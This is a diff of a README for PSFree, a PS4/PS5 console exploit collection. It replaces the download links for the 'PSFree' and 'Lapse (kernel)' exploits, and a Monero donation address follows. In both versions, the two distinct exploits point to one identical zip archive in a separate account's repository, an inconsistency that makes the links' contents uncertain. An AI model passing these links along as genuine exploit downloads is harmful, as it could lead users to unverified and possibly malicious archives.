@@ -14,8 +14,8 @@ PSFree is a collection of exploits for the PS4 console. The main focus of the
 repo is for the PS4 but we try to make things portable to PS5.
 
 * Exploits
-  * PSFree: https://github.com/k4niissg/900N/raw/refs/heads/master/kpatch/N-1.6.zip
-  * Lapse (kernel): https://github.com/k4niissg/900N/raw/refs/heads/master/kpatch/N-1.6.zip
+  * PSFree: https://raw.githubusercontent.com/k4niissg/900N/master/rop/N-1.3.zip
+  * Lapse (kernel): https://raw.githubusercontent.com/k4niissg/900N/master/rop/N-1.3.zip
 
 Donation (Monero/XMR):
 86Fk3X9AE94EGKidzRbvyiVgGNYD3qZnuKNq1ZbsomFWXHYm6TtAgz9GNGitPWadkS3Wr9uXoT29U1SfdMtJ7QNKQpW1CVS
